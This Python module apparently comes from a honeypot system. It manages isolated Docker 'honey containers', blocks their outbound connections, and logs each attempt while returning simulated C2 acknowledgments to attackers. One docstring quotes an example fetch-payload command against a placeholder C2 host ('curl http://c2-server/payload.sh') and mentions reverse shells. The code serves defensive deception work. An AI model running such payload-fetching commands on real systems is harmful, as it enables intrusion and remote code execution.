"""
High-Level Docker Sandbox Manager (`isolation_sandbox.docker_sandbox_manager.manager`).

Coordinates container provisioning, strict air-gapped network quarantine on
`sandbox_containment_net` (`172.29.0.0/24`), outbound C2/reverse-shell egress
interception, and container sanitization.
"""

from __future__ import annotations

import logging
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

from isolation_sandbox.docker_sandbox_manager.container_lifecycle import (
    ContainerLifecycleController,
    ContainerStateEnum,
    HoneyContainerInstance,
    ResourceQuotaPolicy,
)

logger = logging.getLogger(__name__)


class DockerSandboxManager:
    """
    Orchestrates isolated honey containers and enforces air-gapped network
    containment policies to prevent outbound reverse shells or lateral movement
    while capturing C2 indicators.
    """

    def __init__(
        self,
        lifecycle_controller: Optional[ContainerLifecycleController] = None,
    ) -> None:
        self.lifecycle: ContainerLifecycleController = (
            lifecycle_controller or ContainerLifecycleController()
        )

    async def provision_honey_container(
        self,
        preferred_container_id: Optional[str] = None,
        quota: Optional[ResourceQuotaPolicy] = None,
    ) -> HoneyContainerInstance:
        """
        Provision or retrieve an isolated honey container ready for attacker containment.
        """
        return await self.lifecycle.spawn_container(
            container_id=preferred_container_id,
            quota=quota,
        )

    async def bind_container_to_session(
        self,
        container_id: str,
        session_id: str,
    ) -> HoneyContainerInstance:
        """
        Mark a honey container as actively bound to `session_id`.
        """
        return await self.lifecycle.mark_container_bound(
            container_id=container_id,
            session_id=session_id,
        )

    async def intercept_outbound_egress(
        self,
        container_id: str,
        session_id: str,
        destination_ip: str,
        destination_port: int,
        protocol: str = "TCP",
        payload_preview: str = "",
    ) -> Dict[str, Any]:
        """
        Intercept and block any outbound network connection initiated inside the
        isolated container (such as `curl http://c2-server/payload.sh` or a reverse
        shell), while returning a realistic simulated response so the attacker
        believes the connection succeeded and reveals further C2 infrastructure.
        """
        container = await self.lifecycle.inspect_container(container_id)
        if container is None:
            container = await self.provision_honey_container(
                preferred_container_id=container_id
            )

        interception_record = {
            "interception_id": f"egress_{uuid.uuid4().hex[:12]}",
            "session_id": session_id,
            "container_id": container.container_id,
            "source_ip": container.internal_ip,
            "destination_ip": destination_ip,
            "destination_port": int(destination_port),
            "protocol": protocol.upper(),
            "payload_preview": payload_preview[:512],
            "blocked_real_egress": True,
            "simulated_c2_ack": True,
            "captured_at": datetime.now(timezone.utc).isoformat(),
        }
        container.intercepted_egress_attempts.append(interception_record)
        return interception_record

    async def release_and_sanitize_container(
        self,
        container_id: str,
        destroy_permanently: bool = False,
    ) -> bool:
        """
        Either destroy the container permanently or sanitize and recycle it back
        into the prewarmed pool.
        """
        if destroy_permanently:
            return await self.lifecycle.teardown_container(container_id)
        recycled = await self.lifecycle.sanitize_and_recycle(container_id)
        return recycled is not None

    async def list_containers(
        self, state_filter: Optional[ContainerStateEnum] = None
    ) -> List[HoneyContainerInstance]:
        """Return all tracked containers, optionally filtered by lifecycle state."""
        return await self.lifecycle.list_all_containers(state_filter=state_filter)

    async def get_manager_status(self) -> Dict[str, Any]:
        """Return aggregated health and containment statistics for the sandbox manager."""
        all_containers = await self.lifecycle.list_all_containers()
        by_state: Dict[str, int] = {state.value: 0 for state in ContainerStateEnum}
        total_egress_blocked = 0
        for c in all_containers:
            by_state[c.state.value] = by_state.get(c.state.value, 0) + 1
            total_egress_blocked += len(c.intercepted_egress_attempts)

        return {
            "total_managed_containers": len(all_containers),
            "containers_by_state": by_state,
            "total_outbound_egress_intercepted": total_egress_blocked,
            "containment_network": "sandbox_containment_net (172.29.0.0/24, internal=true)",
        }
